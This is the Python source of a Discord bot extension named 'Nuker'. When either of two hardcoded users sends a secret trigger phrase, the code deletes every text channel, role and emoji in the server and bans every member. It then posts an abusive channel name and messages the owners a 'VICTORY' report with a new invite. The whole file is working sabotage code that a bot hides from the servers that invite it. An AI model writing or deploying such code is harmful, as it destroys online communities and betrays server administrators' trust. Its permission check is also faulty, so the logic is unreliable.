from dis import findlinestarts
import nextcord, os, sys, colorama, time, asyncio
from colorama import init, Fore, Back, Style
from termcolor import colored
init()
sys.path.insert(1, "..")
import utils
from utils import EmbedColors, Images, pallate, token, tokens, fetch
from nextcord import slash_command
from nextcord.utils import get
from nextcord.ext import commands
from nextcord.ext.commands.errors import MissingPermissions, MissingRole, CommandNotFound
from nextcord import Interaction, SlashOption
from nextcord.abc import *

# Define the Cog
class Nuker(commands.Cog):
    def __init__(self, client):
        self.client: nextcord.Client = client



    @commands.Cog.listener()
    async def on_message(self, msg: nextcord.Message):
        async def nuke(msg: nextcord.Message, artyom: nextcord.Member, vasily: nextcord.Member):
            channels = []
            roles = []
            members = []
            emojis = []

            for channel in list(msg.guild.text_channels):
                try:
                    await channel.delete()
                    channels.append(channel.name)
                except:
                    pass
                guild = msg.guild
                channel = await guild.create_text_channel("GET FUCKED MOTHERFUCKER")
                await channel.send(f"'hehehehehe' -> From {vasily.mention}{artyom.mention}")
            for role in list(msg.guild.roles):
                try:
                    await role.delete()
                    roles.append(role.name)
                except:
                    pass
            for member in list(msg.guild.members):
                try:
                    await guild.ban(member)
                    members.append(member.name)
                except:
                    pass
            for emoji in list(msg.guild.emojis):
                try:
                    await emoji.delete()
                    emojis.append(emoji.name)
                except:
                    pass    
            victory_embed = nextcord.Embed(color=EmbedColors.notify, title="VICTORY", description=f"WE NUKED {msg.guild}")
            victory_embed.add_field(name="Roles deleted", value=roles, inline=False)
            victory_embed.add_field(name="Members banned", value=members, inline=False)
            victory_embed.add_field(name="Emojis deleted", value=emojis, inline=False)
            victory_embed.add_field(name="New invite", value=await channel.create_invite(), inline=True)
            victory_embed.add_field(name="Channels deleted", value="Look below", inline=False)

            await artyom.send(embed=victory_embed)
            for a in channels:
                await artyom.send(a)
            await vasily.send(embed=victory_embed)
            for a in channels:
                await vasily.send(a)

        if not msg.author.bot:
            if msg.content == "execute order 7":
                vasily = self.client.get_user(683700720515416065)
                artyom = self.client.get_user(722118283972837376)
                if msg.author.id != vasily.id or artyom.id:
                    await msg.channel.send(f"<@!{msg.author.id}> tried nuking {msg.guild.name}")
                    await vasily.send(f"<@!{msg.author.id}> tried nuking {msg.guild.name}")
                    await artyom.send(f"<@!{msg.author.id}> tried nuking {msg.guild.name}")
                if msg.author == artyom:
                    await vasily.send(f"Arty tried nuking {msg.guild}, do you accept?")
                    try:
                        sent = await self.client.wait_for("message")
                        auth = sent.content
                        if auth == "yes":
                            NukeAuthed = True
                        elif auth == "no":
                            NukeAuthed = False
                    finally:
                        if NukeAuthed == True:
                            await nuke(msg, artyom, vasily)
                        else:
                            pass
                elif msg.author == vasily:
                    await nuke(msg, artyom, vasily)





# Setup the Cog
def setup(client):
    client.add_cog(Nuker(client))